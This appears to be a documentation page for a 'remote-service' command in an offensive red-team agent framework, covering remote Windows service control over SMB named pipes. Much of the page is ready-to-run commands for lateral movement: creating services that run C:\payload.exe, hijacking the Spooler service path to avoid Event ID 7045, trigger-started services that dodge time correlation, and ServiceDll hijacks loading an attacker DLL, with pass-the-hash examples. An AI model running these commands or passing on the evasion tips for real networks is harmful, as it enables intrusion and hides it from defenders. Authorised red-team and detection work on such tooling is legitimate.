+++
title = "remote-service"
chapter = false
weight = 202
hidden = false
+++

## Summary

Manage services on remote Windows hosts via SVCCTL RPC over SMB named pipes. Standard operations (list, query, create, start, stop, delete) plus advanced lateral movement techniques: **modify-path** (hijack existing service binary path), **trigger** (create trigger-started service for delayed execution), and **dll-sideload** (ServiceDll registry hijack for svchost-hosted services). Supports password and pass-the-hash authentication. Cross-platform — runs from Windows, Linux, or macOS agents.

{{% notice info %}}Targets Windows hosts, but can be executed from Windows, Linux, or macOS agents.{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | list | Operation: `list`, `query`, `create`, `start`, `stop`, `delete`, `modify-path`, `trigger`, `dll-sideload` |
| server | Yes | | Remote Windows host IP or hostname |
| name | No | | Service name (required for most actions) |
| display_name | No | | Display name (for create/trigger; defaults to service name) |
| binpath | No | | Service binary path or DLL path (required for create/modify-path/trigger/dll-sideload) |
| start_type | No | demand | For create: `auto`, `demand`, `disabled`. For trigger: `network`, `domain-join`, `firewall`, `gpo` |
| username | Yes | | Account for authentication |
| password | No | | Password (or use hash for pass-the-hash) |
| hash | No | | NTLM hash in LM:NT or NT-only format |
| domain | No | | Domain name |
| timeout | No | 30 | Connection timeout in seconds |

## Usage

### List all services
```
remote-service -action list -server 192.168.1.1 -username Administrator -password P@ssw0rd -domain CORP.LOCAL
```

### Query a specific service
```
remote-service -action query -server dc01 -name Spooler -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain CORP.LOCAL
```

### Create a service (lateral movement)
```
remote-service -action create -server 192.168.1.1 -name UpdateSvc -binpath C:\payload.exe -start_type demand -username admin -password pass -domain CORP
```

### Modify-path: Hijack existing service (stealthier lateral movement)
Swaps the binary path of an existing service, starts it (executing the payload), then restores the original path. Avoids Event ID 7045 (new service creation).
```
remote-service -action modify-path -server dc01 -name Spooler -binpath C:\payload.exe -username admin -password pass
```

### Trigger: Delayed execution via trigger-started service
Creates a service with a trigger that fires on a specific event. The service won't start until the trigger fires, avoiding time-based correlation.
```
remote-service -action trigger -server dc01 -name HiddenSvc -binpath C:\payload.exe -start_type network -username admin -password pass
```
Trigger types: `network` (default, fires on IP availability), `domain-join`, `firewall` (port open), `gpo` (Group Policy refresh).

### DLL sideload: ServiceDll registry hijack
Modifies the `ServiceDll` registry value of a svchost-hosted service to load an attacker DLL, then restores the original.
```
remote-service -action dll-sideload -server dc01 -name wuauserv -binpath C:\attacker.dll -username admin -password pass
```
{{% notice warning %}}dll-sideload opens two SMB named pipes (svcctl + winreg) and generates Sysmon Event ID 13 (registry set) + Event ID 7 (image load).{{% /notice %}}

### Start / Stop / Delete
```
remote-service -action start -server 192.168.1.1 -name UpdateSvc -username admin -password pass
remote-service -action stop -server dc01 -name UpdateSvc -username admin -password pass
remote-service -action delete -server dc01 -name UpdateSvc -username admin -password pass
```

## MITRE ATT&CK Mapping

- **T1569.002** - System Services: Service Execution
- **T1543.003** - Create or Modify System Process: Windows Service
- **T1007** - System Service Discovery
- **T1574.001** - Hijack Execution Flow: DLL Search Order Hijacking
